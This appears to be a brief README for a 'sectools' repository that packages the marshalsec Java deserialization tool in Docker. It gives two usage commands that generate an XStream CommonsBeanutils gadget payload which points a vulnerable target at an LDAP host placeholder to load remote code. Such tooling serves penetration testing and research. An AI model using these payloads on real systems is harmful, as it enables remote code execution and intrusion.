# sectools

## java
### deserialize
#### marshalsec
dockerized marshalsec
https://github.com/mbechler/marshalsec

usage:
`docker run -ti --rm ssst0n3/sectools:marshalsec marshalsec.XStream CommonsBeanutils ldap://<IP>:<PORT>/exp > payload.xml`

same as

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils ldap://<IP>:<PORT>/exp > payload.xml`